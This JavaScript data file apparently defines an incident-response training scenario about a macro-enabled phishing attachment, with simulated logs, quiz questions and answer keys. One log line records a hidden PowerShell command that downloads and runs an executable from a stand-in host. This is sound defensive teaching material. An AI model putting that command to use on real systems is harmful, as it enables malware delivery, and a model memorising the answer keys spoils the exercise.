scenarios.push({
    id: "ir-scenario-2026-phishing-macro",
    title: "Operation Invoice Trap: Macro-enabled Phishing",
    description: "Malicious process execution detected on a finance workstation following the opening of a macro-enabled document from an external source.",
    logs: {
        proxy: [
            "2026-06-02T08:15:20Z - IP: 192.168.10.33 - URL: https://bamboohr.com/dashboard - Action: Allowed - Category: HR/Business - Status: 200 - Bytes: 12500",
            "2026-06-02T08:22:45Z - IP: 192.168.10.14 - URL: https://github.com/company-org/backend - Action: Allowed - Category: IT/Development - Status: 200 - Bytes: 45200",
            "2026-06-02T08:35:10Z - IP: 192.168.10.10 - URL: https://canva.com/design - Action: Allowed - Category: Media/Arts - Status: 200 - Bytes: 850000",
            "2026-06-02T09:20:20Z - IP: 192.168.10.12 - URL: http://198.51.100.44/payloads/sys_update.exe - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 1450000",
            "2026-06-02T09:21:00Z - IP: 192.168.10.12 - URL: https://198.51.100.44/api/v1/connect - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 512",
            "2026-06-02T09:22:00Z - IP: 192.168.10.12 - URL: https://198.51.100.44/api/v1/connect - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 512",
            "2026-06-02T09:23:00Z - IP: 192.168.10.12 - URL: https://198.51.100.44/api/v1/connect - Action: Allowed - Category: Uncategorized - Status: 200 - Bytes: 512",
            "2026-06-02T09:30:15Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Status: 200 - Bytes: 3100"
        ],
        email: [
            "2026-06-02T08:00:10Z - Inbound - From: notifications@slack.com - To: asmith@company.com - Subject: Daily Team Sync - Status: Delivered",
            "2026-06-02T08:12:15Z - Inbound - From: alerts@bamboohr.com - To: mrogers@company.com - Subject: New Time Off Request - Status: Delivered",
            "2026-06-02T09:15:00Z - Inbound - From: billing@vendor-invoicing-portal.com - To: fsmith@company.com - Subject: URGENT: Action Required - Overdue_Invoice_Q2 - Attachment: Overdue_Invoice_Q2.xlsm - Status: Delivered",
            "2026-06-02T09:40:00Z - Inbound - From: newsletter@techtrends.com - To: rjones@company.com - Subject: Weekly Technology Brief - Status: Delivered"
        ],
        file_server: [
            "2026-06-02T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
            "2026-06-02T08:21:05Z - Object Accessed: \\\\FILE-SRV-01\\Public\\Templates\\Brand_Kit.zip - Accesses: ReadData - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
            "2026-06-02T08:48:00Z - Share Name: \\\\FILE-SRV-01\\HR - Access Request: Allowed - Source IP: 192.168.10.33 - User: COMPANY\\mrogers",
            "2026-06-02T08:49:15Z - Object Accessed: \\\\FILE-SRV-01\\HR\\Onboarding\\Benefits_Guide.pdf - Accesses: ReadData - Source IP: 192.168.10.33 - User: COMPANY\\mrogers"
        ],
        workstations: [
            "2026-06-02T08:01:22Z - WKSTN-01 (192.168.10.10) - EventID: 4688 - Process Created: explorer.exe spawned slack.exe --startup",
            "2026-06-02T08:22:00Z - WKSTN-03 (192.168.10.14) - EventID: 4688 - Process Created: explorer.exe spawned cmd.exe /c ping 8.8.8.8",
            "2026-06-02T09:18:30Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
            "2026-06-02T09:20:10Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: outlook.exe spawned excel.exe \"C:\\Users\\fsmith\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Overdue_Invoice_Q2.xlsm\"",
            "2026-06-02T09:20:15Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: excel.exe spawned powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://198.51.100.44/payloads/sys_update.exe' -OutFile '$env:APPDATA\\sys_update.exe'; Start-Process '$env:APPDATA\\sys_update.exe'\"",
            "2026-06-02T09:20:30Z - WKSTN-02 (192.168.10.12) - EventID: 4688 - Process Created: powershell.exe spawned C:\\Users\\fsmith\\AppData\\Roaming\\sys_update.exe",
            "2026-06-02T09:20:35Z - WKSTN-02 (192.168.10.12) - EventID: 7045 - Service Created: SysUpdateSvc - Service File Name: C:\\Users\\fsmith\\AppData\\Roaming\\sys_update.exe - User Context: LocalSystem",
            "2026-06-02T09:45:00Z - WKSTN-33 (192.168.10.33) - EventID: 4800 - Workstation Locked - User: COMPANY\\mrogers"
        ],
        auth_logs: [
            "2026-06-02T08:00:15Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
            "2026-06-02T08:10:00Z - WKSTN-33 (192.168.10.33) - EventID: 4624 - Successful Logon - User: COMPANY\\mrogers - Logon Type: 2 (Interactive)",
            "2026-06-02T08:15:00Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones - Logon Type: 2 (Interactive)",
            "2026-06-02T08:45:10Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith - Logon Type: 2 (Interactive)"
        ]
    },
    questions: {
        vector: {
            label: "What was the initial delivery vector used to compromise the workstation?",
            type: "select",
            options: [
                "An unauthenticated VPN connection bypass exploiting stale user accounts",
                "A spear-phishing email containing a macro-enabled Excel attachment",
                "A malicious drive-by download via a compromised web advertisement",
                "A supply chain compromise in a third-party software library"
            ],
            correct: "A spear-phishing email containing a macro-enabled Excel attachment"
        },
        origin: {
            label: "Identify the internal host utilized by the victim during the initial execution phase (Patient Zero):",
            type: "select",
            options: [
                "WKSTN-01",
                "WKSTN-02",
                "WKSTN-03",
                "WKSTN-33"
            ],
            correct: "WKSTN-02"
        },
        indicator: {
            label: "Which specific parent-child process relationship confirms the execution of the malicious VBA macro?",
            type: "select",
            options: [
                "explorer.exe spawning cmd.exe to run a ping sweep",
                "outlook.exe spawning excel.exe to view the attachment",
                "excel.exe spawning powershell.exe with hidden window styles",
                "powershell.exe spawning sys_update.exe from the AppData folder"
            ],
            correct: "excel.exe spawning powershell.exe with hidden window styles"
        },
        persistence: {
            label: "How did the secondary payload ensure persistence on the compromised machine?",
            type: "select",
            options: [
                "By creating a new rogue administrative user account",
                "By dropping an unauthorized IIS Web Shell in the server's public root",
                "By adding a persistent registry Run key inside the user profile",
                "By registering the dropped executable as a new Windows service (SysUpdateSvc)"
            ],
            correct: "By registering the dropped executable as a new Windows service (SysUpdateSvc)"
        }
    },
    principles: [
        "Phishing / Social Engineering",
        "Beaconing / Command & Control",
        "Persistence"
    ],
    explanation: "At 09:15:00Z, finance user 'fsmith' received a spear-phishing email containing an attachment named 'Overdue_Invoice_Q2.xlsm'. At 09:20:10Z, the user opened the document on WKSTN-02. Upon enabling content, the malicious VBA macro embedded within the spreadsheet executed, generating an anomalous parent-child process relationship: excel.exe spawned powershell.exe with bypass policies and hidden window styles. This PowerShell script reached out to the external IP 198.51.100.44 to download a secondary executable ('sys_update.exe') into the local AppData directory. The payload then established persistence by creating a new system service (SysUpdateSvc, EventID 7045) and began emitting a rigid 60-second C2 heartbeat over HTTPS. Background noise included benign command-line network tests by IT personnel ('rjones') and standard file-sharing access by marketing and HR employees."
});